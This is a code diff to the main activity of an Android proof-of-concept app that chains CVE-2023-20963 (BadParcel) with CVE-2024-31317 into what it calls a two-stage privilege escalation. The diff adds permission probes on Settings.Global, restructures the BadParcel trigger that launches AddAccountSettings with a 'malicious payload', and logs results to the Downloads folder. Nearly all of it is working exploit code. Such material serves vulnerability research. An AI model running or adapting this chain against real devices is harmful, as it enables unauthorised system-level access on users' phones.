@@ -9,6 +9,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
 
 import java.io.File;
@@ -27,9 +28,49 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        appendLog("[*] BadParcel + SecureUI PoC started.");
-        appendLog("[*] Triggering CVE-2023-20963...");
+        appendLog("[*] ========================================");
+        appendLog("[*] CVE-2023-20963 + CVE-2024-31317 PoC");
+        appendLog("[*] Two-stage privilege escalation chain");
+        appendLog("[*] ========================================");
 
+        // ---- ステージ0: 通常アプリの権限確認 ----
+        appendLog("[*] Stage 0: Checking normal app permissions...");
+        checkNormalAppPermissions();
+
+        // ---- ステージ1: BadParcel (CVE-2023-20963) ----
+        appendLog("[*] Stage 1: Triggering BadParcel (CVE-2023-20963)...");
+        triggerBadParcel();
+
+        // ---- ステージ2: システム権限でCVE-2024-31317を実行（ProofActivityで実施） ----
+        appendLog("[*] Stage 2: Will be executed by ProofActivity if BadParcel succeeds");
+
+        // 15秒後に終了
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            appendLog("[*] PoC finished. Check /sdcard/Download/ for proof.");
+            saveLog();
+            finish();
+        }, 20000);
+    }
+
+    private void checkNormalAppPermissions() {
+        try {
+            boolean result = Settings.Global.putString(getContentResolver(),
+                    "test_normal_app", "should_fail");
+            appendLog("[+] Settings.Global write (normal app): " + result + " (expected: false)");
+        } catch (Exception e) {
+            appendLog("[-] Settings.Global write error (normal app): " + e.getMessage());
+        }
+
+        try {
+            String val = Settings.Global.getString(getContentResolver(),
+                    "hidden_api_blacklist_exemptions");
+            appendLog("[+] Current hidden_api_blacklist_exemptions: " + val);
+        } catch (Exception e) {
+            appendLog("[-] Failed to read hidden_api_blacklist_exemptions: " + e.getMessage());
+        }
+    }
+
+    private void triggerBadParcel() {
         try {
             AccountManager am = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
             am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
@@ -49,12 +90,6 @@ public class MainActivity extends Activity {
         attacker.putExtra("account_types", authTypes);
         startActivity(attacker);
         appendLog("[+] AddAccountSettings launched with malicious payload.");
-
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            appendLog("[*] PoC finished. Check /sdcard/Download/ for proof.");
-            saveLog();
-            finish();
-        }, 15000);
     }
 
     public static void appendLog(String msg) {
@@ -68,7 +103,7 @@ public class MainActivity extends Activity {
         try {
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists() && !dir.mkdirs()) return;
-            File file = new File(dir, "badparcel_poc_log.txt");
+            File file = new File(dir, "two_stage_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new FileOutputStream(file))) {
                 pw.print(logBuilder.toString());
             }
